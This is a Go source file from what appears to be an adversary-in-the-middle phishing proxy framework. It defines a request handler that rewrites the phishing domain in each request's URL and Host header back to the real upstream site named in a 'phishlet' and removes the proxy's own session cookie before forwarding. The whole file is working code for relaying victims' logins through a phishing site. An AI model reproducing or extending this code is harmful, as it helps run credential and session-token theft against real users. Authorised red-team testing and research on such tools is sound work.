package request

import (
	"net/http"
	"strings"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/internal/proxy"
)

// URLRewriter rewrites the request URL and Host header from the phishing domain
// back to the real upstream domain before forwarding to origin.
type URLRewriter struct{}

func (h *URLRewriter) Name() string { return "URLRewriter" }

func (h *URLRewriter) Handle(ctx *aitm.ProxyContext, req *http.Request) error {
	if ctx.Phishlet == nil {
		return nil
	}
	origHost := resolveOrigHost(ctx.Phishlet, req.Host)
	if origHost != "" {
		req.Host = origHost
		req.URL.Host = origHost
	}
	stripCookie(req, sessionCookieName)
	return nil
}

func resolveOrigHost(p *aitm.Phishlet, phishHost string) string {
	lowerPhishHost := strings.ToLower(phishHost)
	for _, proxyHost := range p.ProxyHosts {
		phishFQDN := strings.ToLower(proxyHost.PhishSubdomain + "." + p.BaseDomain)
		if lowerPhishHost == phishFQDN {
			return proxyHost.OrigSubdomain + "." + proxyHost.Domain
		}
	}
	return ""
}

func stripCookie(req *http.Request, name string) {
	cookies := req.Cookies()
	req.Header.Del("Cookie")
	for _, cookie := range cookies {
		if cookie.Name != name {
			req.AddCookie(cookie)
		}
	}
}

var _ proxy.RequestHandler = (*URLRewriter)(nil)
